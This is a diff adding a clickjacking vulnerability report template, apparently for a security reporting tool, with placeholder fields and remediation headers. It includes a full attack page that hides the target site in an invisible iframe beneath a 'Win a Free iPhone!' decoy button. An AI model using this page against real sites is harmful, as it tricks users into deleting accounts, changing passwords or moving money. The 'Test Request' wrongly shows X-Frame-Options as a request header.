@@ -1,0 +1,129 @@
+# {title}
+**Vulnerability Type:** Clickjacking (UI Redressing)  
+**Severity:** {severity}  
+**Date:** {date}
+
+## Summary
+A Clickjacking vulnerability was discovered that allows attackers to trick users into clicking on elements they didn't intend to interact with.
+
+## Vulnerable Endpoint
+- **URL:** `{url}`
+
+## Proof of Concept
+
+### Malicious HTML Payload
+```html
+{payload}
+```
+
+### Steps to Reproduce
+1. Create an HTML page with the malicious iframe payload
+2. Host the page on an attacker-controlled domain
+3. Trick users into visiting the malicious page
+4. Observe that the vulnerable page loads within the iframe
+5. Users unknowingly interact with the hidden vulnerable page
+
+### Complete Attack Page Example
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Free iPhone!</title>
+    <style>
+        .clickjack {{
+            position: relative;
+            width: 500px;
+            height: 300px;
+            border: 2px solid #ff0000;
+            background: #ffcccc;
+        }}
+        
+        .iframe-layer {{
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.0; /* Invisible iframe */
+            z-index: 2;
+        }}
+        
+        .decoy-button {{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #4CAF50;
+            color: white;
+            padding: 15px 32px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            z-index: 1;
+        }}
+    </style>
+</head>
+<body>
+    <div class="clickjack">
+        <button class="decoy-button">Click to Win iPhone!</button>
+        <iframe src="{url}" class="iframe-layer"></iframe>
+    </div>
+</body>
+</html>
+```
+
+### Test Request
+```http
+GET {url} HTTP/1.1
+Host: {host}
+User-Agent: Mozilla/5.0 (compatible; Security-Test/1.0)
+X-Frame-Options: (should be DENY or SAMEORIGIN but is missing)
+```
+
+## Impact
+- Unauthorized actions performed by users
+- Account compromise through tricked interactions
+- Privilege escalation
+- Data modification without consent
+- Social engineering attacks
+- CSRF attacks enhancement
+
+## Attack Scenarios
+1. **Account Deletion:** Trick users into deleting their accounts
+2. **Password Changes:** Force users to change passwords
+3. **Financial Transactions:** Unauthorized money transfers
+4. **Social Media:** Unwanted posts or friend requests
+5. **Admin Actions:** Trick administrators into privileged actions
+
+## Risk Rating
+**{severity}** - Clickjacking can lead to unauthorized actions and account compromise.
+
+## Remediation
+1. Implement X-Frame-Options header
+2. Use Content Security Policy (CSP) frame-ancestors directive
+3. Implement JavaScript frame-busting techniques
+4. Use SameSite cookie attributes
+5. Implement proper CSRF tokens
+
+### Recommended Headers
+```http
+X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+### Alternative Configuration
+```http
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+```
+
+### JavaScript Frame-Busting Example
+```javascript
+if (top !== self) {{
+    top.location.href = self.location.href;
+}}
+```
+
+## References
+- [OWASP Clickjacking Defense Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
+- [CWE-1021: Improper Restriction of Rendered UI Layers](https://cwe.mitre.org/data/definitions/1021.html)
